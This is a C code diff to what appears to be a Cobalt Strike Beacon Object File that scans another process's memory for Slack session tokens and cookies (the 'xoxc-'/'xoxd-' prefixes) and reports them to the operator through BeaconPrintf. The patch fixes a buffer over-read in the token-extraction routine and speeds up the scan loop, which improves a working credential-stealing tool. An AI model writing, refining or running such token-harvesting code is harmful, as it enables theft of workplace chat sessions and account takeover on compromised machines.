@@ -49,10 +49,10 @@ BOOL GetProcessList( int pid )
   return( TRUE );
 }
 
-void extractSubstring(const char *input, unsigned char *output) {
+void extractSubstring(const char *input, unsigned char *output, size_t remaining) {
     // Copy characters from input to output up to MAX_LENGTH or until null terminator
     int i;
-    for (i = 0; i < MAX_LENGTH && input[i] != '\0'; ++i) {
+    for (i = 0; i < MAX_LENGTH - 1 && i < remaining && input[i] != '\0'; ++i) {
         output[i] = (unsigned char)input[i];
     }
     output[i] = '\0'; // Null-terminate the output string
@@ -104,8 +104,9 @@ void Write_Memory_Range( HANDLE hProcess, LPCVOID address, size_t address_sz)
         // search for xox(c|d)- [78 6f 78 (63|64) 2d] 
         if (buffer[index] == 0x78 && buffer[index + 1] == 0x6f && buffer[index + 2] == 0x78 && (buffer[index + 3] == 0x64 || buffer[index + 3] == 0x63) && buffer[index + 4] == 0x2d)
         {
-            extractSubstring(buffer + index, output);
+            extractSubstring(buffer + index, output, remainingSize);
             BeaconPrintf(CALLBACK_OUTPUT, "Slack Cookie/Token: %s\n", output);
+            index += MSVCRT$strlen(output) - 1;
         }
     }
 END:
